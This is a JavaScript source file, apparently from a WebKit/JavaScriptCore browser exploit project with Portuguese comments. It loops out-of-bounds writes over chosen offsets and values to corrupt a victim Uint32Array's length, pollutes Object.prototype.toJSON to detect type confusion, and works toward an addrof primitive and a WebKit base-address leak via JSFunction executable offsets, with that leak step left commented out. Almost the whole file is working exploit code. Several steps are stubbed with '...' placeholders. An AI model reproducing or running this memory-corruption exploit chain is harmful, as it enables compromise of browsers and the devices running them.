// js/script3/testArrayBufferVictimCrash.mjs (R43L - Testes Massivos Revisados)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_MassiveRevised";

const VICTIM_TA_DEFAULT_SIZE_ELEMENTS = 8;
// const VICTIM_TA_DEFAULT_BUFFER_SIZE_BYTES = VICTIM_TA_DEFAULT_SIZE_ELEMENTS * 4; // Não usado diretamente

const OOB_OFFSETS_TO_TEST = [0x5C, 0x6C, 0x70, 0x74, 0x78, 0x7C, 0x80, 0x84, 0x9C];
const OOB_VALUES_TO_TEST = [
    0xABABABAB, 0xFFFFFFFF, 0x00000000, 0x41414141, // 'AAAA'
    (JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID || 0xDEF00002), // Usa o ID ou um fallback
];

const FILL_PATTERN_MASSIVE_REVISED = 0xFEEDBEEF;
const PROBE_CALL_LIMIT_V82 = 10;

const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);

let global_target_function_for_webkit_leak; // Usado se addrof for bem-sucedido para uma função
let leaked_address_via_addrof = null;     // Endereço genérico obtido por addrof
let found_addrof_primitive_in_iteration = false; // Resetado por iteração
// let found_fakeobj_primitive_in_iteration = false; // Para futuras tentativas de fakeobj
let found_arb_rw_via_victim_ta_in_iteration = false; // Resetado por iteração

function isValidPointer(ptr, context = "") {
    if (!isAdvancedInt64Object(ptr)) { logS3(`[isValidPointer-${context}] Input não é AdvInt64: ${String(ptr)}`, "debug_detail"); return false; }
    const high = ptr.high(); const low = ptr.low();
    if (high === 0 && low === 0) { logS3(`[isValidPointer-${context}] NULO: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if (high === 0x7FF80000 && low === 0x0) { logS3(`[isValidPointer-${context}] NaN Específico: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if ((high & 0x7FF00000) === 0x7FF00000 && ((high & 0x000FFFFF) !== 0 || low !== 0)) { logS3(`[isValidPointer-${context}] NaN Genérico: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if (high === 0 && low < 0x10000) { logS3(`[isValidPointer-${context}] Ponteiro Baixo: ${ptr.toString(true)}`, "debug_detail"); return false; }
    return true;
}

function safeToHex(value, length = 8) {
    if (typeof value === 'number') {
        return '0x' + (value >>> 0).toString(16).padStart(length, '0');
    }
    if (value === null || value === undefined) {
        return String(value); // Retorna 'null' ou 'undefined' como string
    }
    // Se toHex for do utils.mjs e puder lidar com outros tipos, ele será chamado.
    // Caso contrário, converter para string para evitar erros se toHex esperar tipos específicos.
    try {
        return toHex(value); 
    } catch (e) {
        return String(value);
    }
}

function logTypedArrayShort(ta, name = "TypedArray", max = 4) {
    if (!ta || typeof ta.slice !== 'function') { return "N/A"; }
    const content = Array.from(ta.slice(0, Math.min(ta.length, max))).map(v => safeToHex(v));
    return `${name}[${content.join(", ")}${ta.length > max ? "..." : ""}] (len:${ta.length}, byteLen:${ta.byteLength})`;
}


export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Testes Massivos Revisados ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init MassiveRev...`;

    global_target_function_for_webkit_leak = function someUniqueLeakFunctionR43L_MassiveRevTarget() { return `target_R43L_MassiveRev_${Date.now()}`; };
    
    let final_probe_call_count_for_report = 0; // CORRIGIDO: Declarar no escopo da função principal

    logS3(`--- Fase 0 (MassiveRev): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try { coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3, safeToHex); }
    catch (e_sanity) { logS3(`Erro Sanity: ${e_sanity.message}`, "critical"); coreOOBReadWriteOK = false; }
    logS3(`Sanity Check: ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical');
    await PAUSE_S3(100);

    if (!coreOOBReadWriteOK) { 
        return { 
            errorOccurred: "OOB Sanity Check Failed", tc_probe_details: null, 
            addrof_result: { success: false, msg: "Addrof (MassiveRev): Not run." },
            fakeobj_result: { success: false, msg: "FakeObj (MassiveRev): Not run." },
            webkit_leak_result: { success: false, msg: "WebKit Leak (MassiveRev): Not run." },
            iteration_results_summary: [], total_probe_calls_last_iter: 0, 
            oob_params_of_best_result: null, heisenbug_on_M2_in_best_result: false, 
            best_corruption_details: null 
        }; 
    }

    let iteration_results_summary = [];
    let best_result_overall = { // Renomeado para clareza
        errorOccurred: null, tc_probe_details: null,
        addrof_result: { success: false, msg: "Addrof (MassiveRev): Não obtido.", leaked_object_addr: null },
        fakeobj_result: { success: false, msg: "FakeObj (MassiveRev): Não obtido." },
        webkit_leak_result: { success: false, msg: "WebKit Leak (MassiveRev): Não obtido.", webkit_base_candidate: null },
        oob_params_of_best_result: null,
        heisenbug_on_M2_confirmed_by_tc_probe: false,
        best_corruption_details: null
    };
    
    // Flags globais de sucesso para parar cedo
    let global_addrof_success = false;
    let global_fakeobj_success = false; // Ainda não implementado, mas estrutura pronta
    let global_webkit_leak_success = false;


    for (const current_oob_offset of OOB_OFFSETS_TO_TEST) {
        if (global_addrof_success && global_webkit_leak_success) break; 

        for (const current_oob_value of OOB_VALUES_TO_TEST) {
            if (global_addrof_success && global_webkit_leak_success) break;
            if (current_oob_value === null || current_oob_value === undefined) continue;

            // Resetar flags de sucesso da iteração
            found_addrof_primitive_in_iteration = false;
            found_arb_rw_via_victim_ta_in_iteration = false;
            leaked_address_via_addrof = null; // Resetar endereço vazado

            const current_oob_hex_val = safeToHex(current_oob_value);
            const current_offset_hex = safeToHex(current_oob_offset);
            const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Off${current_offset_hex}_Val${current_oob_hex_val}`;

            logS3(`\n===== ITERATION MassiveRev: Offset OOB: ${current_offset_hex}, Valor OOB: ${current_oob_hex_val} =====`, "subtest", FNAME_CURRENT_ITERATION);
            document.title = `${FNAME_CURRENT_TEST_BASE} Off:${current_offset_hex} Val:${current_oob_hex_val}`;

            let victim_ta_for_analysis = null;
            let iter_corruption_analysis = {
                offset_tested: current_offset_hex, value_written: current_oob_hex_val,
                original_length: VICTIM_TA_DEFAULT_SIZE_ELEMENTS,
                length_after_oob: null, byteLength_after_oob: null,
                length_corrupted: false,
                read_beyond_original_ok: null, read_beyond_value: null,
                fill_pattern_intact: null, notes: ""
            };

            let probe_call_count_iter = 0;
            let m1_ref = null; let m2_ref = null;
            let tc_detected_this_iter = false;
            let tc_details_this_iter = null;

            function massive_test_revised_probe_toJSON() {
                probe_call_count_iter++; const call_num = probe_call_count_iter;
                const ctts = Object.prototype.toString.call(this);
                const is_m2c = (this === m2_ref && m2_ref !== null);

                try {
                    if (call_num > PROBE_CALL_LIMIT_V82) return { r_stop: "limit" };
                    if (call_num === 1 && this === victim_ta_for_analysis) {
                        m2_ref = { id: "M2_MassiveRev" };
                        m1_ref = { id: "M1_MassiveRev", m2: m2_ref };
                        return m1_ref;
                    } else if (is_m2c) {
                        if (!tc_detected_this_iter) {
                            tc_detected_this_iter = true;
                            tc_details_this_iter = { /* ... */ this_is_M2: true, notes: "TC Confirmada."};
                            logS3(`[PROBE_MassiveRev] Call #${call_num} (M2C): FIRST TC. 'this' é M2 (id: ${this.id}). Tipo: ${ctts}`, "vuln");
                        }
                        return this;
                    }
                } catch (e_pm) { /* ... */ }
                return { gen_m: call_num, type: ctts };
            }

            let iter_primary_error = null;
            try {
                await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-OOBSetup` });
                oob_write_absolute(current_oob_offset, current_oob_value, 4);
                logS3(`   OOB Write: ${current_oob_hex_val} @ ${current_offset_hex}`, 'info');
                await PAUSE_S3(50);

                victim_ta_for_analysis = new Uint32Array(VICTIM_TA_DEFAULT_SIZE_ELEMENTS);
                iter_corruption_analysis.original_length = victim_ta_for_analysis.length;
                logS3(`   Victim Uint32Array criado. Len: ${victim_ta_for_analysis.length}, ByteLen: ${victim_ta_for_analysis.byteLength}`, 'info');
                iter_corruption_analysis.length_after_oob = victim_ta_for_analysis.length;
                iter_corruption_analysis.byteLength_after_oob = victim_ta_for_analysis.byteLength;

                if (victim_ta_for_analysis.length !== VICTIM_TA_DEFAULT_SIZE_ELEMENTS) {
                    iter_corruption_analysis.length_corrupted = true;
                    iter_corruption_analysis.notes += `Comprimento CORROMPIDO! (${victim_ta_for_analysis.length}). `;
                    logS3(`   !!! COMPRIMENTO DO victim_ta_for_analysis CORROMPIDO !!! Obtido: ${victim_ta_for_analysis.length}`, "success_major");
                    found_arb_rw_via_victim_ta_in_iteration = true;
                    // ... (tentativa de leitura/escrita em índice alto, como antes)
                    if (victim_ta_for_analysis.length > VICTIM_TA_DEFAULT_SIZE_ELEMENTS && victim_ta_for_analysis.length < 0xFFFF) {
                        try {
                            const high_idx = Math.min(victim_ta_for_analysis.length - 1, VICTIM_TA_DEFAULT_SIZE_ELEMENTS + 100);
                            let val = victim_ta_for_analysis[high_idx];
                            iter_corruption_analysis.read_beyond_original_ok = true;
                            iter_corruption_analysis.read_beyond_value = safeToHex(val);
                            logS3(`   Leitura em índice alto (${high_idx}) OK: ${safeToHex(val)}`, "vuln");
                            // Tentar addrof(global_target_function_for_webkit_leak) usando esta primitiva R/W relativa
                            // Se conseguirmos escrever global_target_function_for_webkit_leak em algum lugar e ler seus bits.
                            // Ex: victim_ta_for_analysis[offset_relativo_para_um_float] = global_target_function_for_webkit_leak;
                            //     ler_bits(victim_ta_for_analysis, offset_relativo_para_um_float)
                            // Isto é complexo e requer conhecimento do layout.
                        } catch (e_high_idx) { iter_corruption_analysis.read_beyond_original_ok = false; }
                    }
                }
                try { /* ... (lógica de verificação de padrão fill) ... */
                    victim_ta_for_analysis.fill(FILL_PATTERN_MASSIVE_REVISED); 
                    let p_ok = true; for(let i=0;i<Math.min(victim_ta_for_analysis.length, VICTIM_TA_DEFAULT_SIZE_ELEMENTS);i++) if(victim_ta_for_analysis[i]!==FILL_PATTERN_MASSIVE_REVISED) p_ok=false;
                    iter_corruption_analysis.fill_pattern_intact = p_ok;
                    if(!p_ok) {iter_corruption_analysis.notes += "Padrão não persistiu. "; logS3(` Padrão NÃO persistiu: ${logTypedArrayShort(victim_ta_for_analysis)}`,"vuln_potential");}
                } catch(e_fill){ iter_corruption_analysis.fill_pattern_intact="exception"; iter_corruption_analysis.notes += `Err fill. `; }

                const ppKey = 'toJSON'; /* ... (lógica da sonda TC como antes) ... */
                let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
                let stringify_output_raw = null;
                try {
                    Object.defineProperty(Object.prototype, ppKey, { value: massive_test_revised_probe_toJSON, writable: true, configurable: true, enumerable: false });
                    polluted = true;
                    stringify_output_raw = JSON.stringify(victim_ta_for_analysis);
                    if (tc_detected_this_iter) logS3(`  TC Probe (MassiveRev): TC CONFIRMADA.`, "vuln");
                    else logS3(`  TC Probe (MassiveRev): TC NÃO Confirmada.`, "warn");
                } catch (e_str) { iter_primary_error = e_str; logS3(`  JSON.stringify EXCEPTION: ${e_str.message}`, "error"); }
                finally { if (polluted) { if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey]; } }

                if (found_addrof_primitive_in_iteration && leaked_address_via_addrof) {
                    global_addrof_success = true; // Sinalizar sucesso global
                    logS3(`ADDROF OBTIDO GLOBALMENTE: ${leaked_address_via_addrof.toString(true)}`, "success_major");
                    // Se o endereço vazado for de uma função, tentar WebKitLeak
                    // Por simplicidade, vamos assumir que se found_addrof_primitive_in_iteration é true,
                    // leaked_address_via_addrof é o endereço de global_target_function_for_webkit_leak
                    // (o que exigiria que a sonda TC o tenha vazado para essa variável global).
                    // Esta lógica precisa ser mais robusta dependendo do que o addrof realmente vaza.
                    if (leaked_address_via_addrof && arb_read) { // Checar se arb_read existe
                        logS3(`  Tentando WebKitLeak com endereço vazado: ${leaked_address_via_addrof.toString(true)}`, "info_emphasis");
                        // ... (Colar lógica do WebKitLeak aqui, usando leaked_address_via_addrof como base)
                        // ... (Se bem-sucedido, definir best_result_overall.webkit_leak_result e global_webkit_leak_success)
                        // Exemplo (precisa ser adaptado e testado cuidadosamente):
                        // try {
                        //    const ptr_exe = await arb_read(leaked_address_via_addrof.add(FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE), 8);
                        //    if (isValidPointer(ptr_exe)) {
                        //        const ptr_jitvm = await arb_read(ptr_exe.add(EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM), 8);
                        //        if (isValidPointer(ptr_jitvm)) {
                        //            const base_candidate = ptr_jitvm.and(new AdvancedInt64(0x0, ~0xFFF));
                        //            logS3(`  POTENCIAL WEBKIT BASE: ${base_candidate.toString(true)}`, "success_major");
                        //            best_result_overall.webkit_leak_result = { success: true, msg: `WebKitLeak OK: ${base_candidate.toString(true)}`, webkit_base_candidate: base_candidate.toString(true) };
                        //            global_webkit_leak_success = true;
                        //        }
                        //    }
                        // } catch(e_wk_leak) { logS3(`  Erro no WebKitLeak especulativo: ${e_wk_leak.message}`, "error"); }
                    }
                }

            } catch (e_outer_iter) { iter_primary_error = e_outer_iter; }
            finally { await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClear` }); }

            final_probe_call_count_for_report = probe_call_count_iter; // Mover para fora do try/catch/finally da iteração
            let current_iter_summary = {
                oob_offset: current_offset_hex, oob_value: current_oob_hex_val,
                raw_oob_offset: current_oob_offset, raw_oob_value: current_oob_value,
                error: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
                tc_probe_details: tc_details_this_iter,
                corruption_analysis: iter_corruption_analysis,
                addrof_success_this_iter: found_addrof_primitive_in_iteration,
                // fakeobj_success_this_iter: found_fakeobj_primitive_in_iteration,
                arb_rw_via_victim_ta_this_iter: found_arb_rw_via_victim_ta_in_iteration,
                heisenbug_on_M2_confirmed_by_tc_probe: tc_detected_this_iter
            };
            iteration_results_summary.push(current_iter_summary);

            // Lógica para atualizar best_result_overall
            if (current_iter_summary.error === null) {
                let current_is_better = false;
                const cur_addrof = current_iter_summary.addrof_success_this_iter;
                const cur_len_corrupt = current_iter_summary.corruption_analysis.length_corrupted;
                const cur_tc = current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe;

                if (best_result_overall.oob_params_of_best_result === null) current_is_better = true;
                else {
                    const best_addrof = best_result_overall.addrof_result.success;
                    const best_len_corrupt = best_result_overall.best_corruption_details?.length_corrupted;
                    const best_tc = best_result_overall.heisenbug_on_M2_confirmed_by_tc_probe;

                    if (cur_addrof && !best_addrof) current_is_better = true;
                    else if (cur_addrof === best_addrof) {
                        if (cur_len_corrupt && !best_len_corrupt) current_is_better = true;
                        else if (cur_len_corrupt === best_len_corrupt) {
                            if (cur_tc && !best_tc && (cur_addrof || cur_len_corrupt)) current_is_better = true; // TC só é "melhor" se já tiver outro sucesso
                            else if (cur_tc && !best_tc && !cur_addrof && !cur_len_corrupt && !best_addrof && !best_len_corrupt) current_is_better = true; // Se tudo mais falhou, TC é melhor
                        }
                    }
                }
                if (current_is_better) {
                    best_result_overall.errorOccurred = null;
                    best_result_overall.tc_probe_details = current_iter_summary.tc_probe_details;
                    best_result_overall.addrof_result.success = current_iter_summary.addrof_success_this_iter;
                    if(current_iter_summary.addrof_success_this_iter && leaked_address_via_addrof) {
                        best_result_overall.addrof_result.leaked_object_addr = leaked_address_via_addrof.toString(true);
                        best_result_overall.addrof_result.msg = `Addrof obtido: ${leaked_address_via_addrof.toString(true)}`;
                    } else if (!current_iter_summary.addrof_success_this_iter) { // Resetar se esta iteração não teve addrof
                        best_result_overall.addrof_result.msg = "Addrof (MassiveRev): Não obtido no melhor resultado.";
                        best_result_overall.addrof_result.leaked_object_addr = null;
                    }
                    best_result_overall.oob_params_of_best_result = { offset: current_offset_hex, value: current_oob_hex_val, raw_offset: current_oob_offset, raw_value: current_oob_value };
                    best_result_overall.heisenbug_on_M2_confirmed_by_tc_probe = current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe;
                    best_result_overall.best_corruption_details = current_iter_summary.corruption_analysis;
                    logS3(`*** NOVO MELHOR RESULTADO: Off ${current_offset_hex} Val ${current_oob_hex_val} (Addrof:${cur_addrof}, LenCorrupt:${cur_len_corrupt}, TC:${cur_tc}) ***`, "success_major");
                }
            }
             document.title = `${FNAME_CURRENT_TEST_BASE} Off:${current_offset_hex} Val:${current_oob_hex_val} TC:${tc_detected_this_iter} LenCorrupt:${iter_corruption_analysis.length_corrupted}`;
             await PAUSE_S3(50);
        }
        if (global_addrof_success && global_webkit_leak_success) break;
        await PAUSE_S3(100);
    }

    // Atribuir final_probe_call_count_for_report ao objeto de resultado final
    best_result_overall.total_probe_calls_last_iter = final_probe_call_count_for_report;
    best_result_overall.iteration_results_summary = iteration_results_summary;
    // Campos para compatibilidade com runner existente (adaptar o runner é melhor a longo prazo)
    best_result_overall.oob_value_of_best_result = best_result_overall.oob_params_of_best_result ? `${best_result_overall.oob_params_of_best_result.offset}_${best_result_overall.oob_params_of_best_result.value}` : "N/A";
    // heisenbug_on_M2_in_best_result já está em best_result_overall.heisenbug_on_M2_confirmed_by_tc_probe

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Final best_result_overall (Massive Test Revised): ${JSON.stringify(best_result_overall, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    
    // ... (lógica de título final como antes, adaptada para os novos campos de sucesso)
    let final_title = `${FNAME_CURRENT_TEST_BASE} Final: `;
    if(best_result_overall.webkit_leak_result.success) final_title += "WEBKITLEAK_OK! ";
    else if(best_result_overall.addrof_result.success) final_title += "ADDROF_OK! ";
    // else if(best_result_overall.fakeobj_result.success) final_title += "FAKEOBJ_OK! "; // Para quando fakeobj for implementado
    else if(best_result_overall.best_corruption_details?.length_corrupted) final_title += "LenCorrupt! ";
    else if(best_result_overall.heisenbug_on_M2_confirmed_by_tc_probe) final_title += "TC_OK ";
    
    if(final_title === `${FNAME_CURRENT_TEST_BASE} Final: `) final_title += "NoMajorSuccess";
    document.title = final_title.trim();

    return best_result_overall;
}
